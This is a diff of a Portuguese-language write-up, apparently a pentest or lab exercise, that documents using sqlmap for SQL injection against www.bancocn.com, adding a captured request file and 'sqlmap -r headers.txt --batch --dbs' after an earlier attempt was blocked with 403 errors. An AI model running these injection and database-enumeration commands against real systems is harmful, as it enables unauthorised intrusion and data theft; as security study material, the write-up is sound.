@@ -308,7 +308,7 @@ sudo apt-get install sqlmap
 
 Mesmo descobrindo que o site possui falha de escrita SQL, o `sqlmap` não conseguiu fazer uma busca pelos bancos de dados na aplicação e respondeu com o seguinte erro
 
-Comando sqlmap: `sqlmap -u "www.bancocn.com/cat.php?id=1" --dbs --batch`
+**Comando sqlmap**: `sqlmap -u "www.bancocn.com/cat.php?id=1" --dbs --batch`
 
 ```bash
 [09:42:00] [WARNING] GET parameter 'id' does not seem to be injectable
@@ -316,5 +316,28 @@ Comando sqlmap: `sqlmap -u "www.bancocn.com/cat.php?id=1" --dbs --batch`
 [09:42:00] [WARNING] HTTP error codes detected during run:
 403 (Forbidden) - 86 times
 ```
+
+Utilizando o `sqlmap` com os headers de autenticação do site na URL `cat.php?id={:id}`
+
+`headers.txt`
+
+```txt
+GET /cat.php?id=1 HTTP/1.1
+Host: www.bancocn.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://www.bancocn.com/
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+
+**Comando sqlmap**: `sqlmap -r headers.txt --batch`
+
+- `sqlmap -r headers.txt --batch --dbs` 
 
 
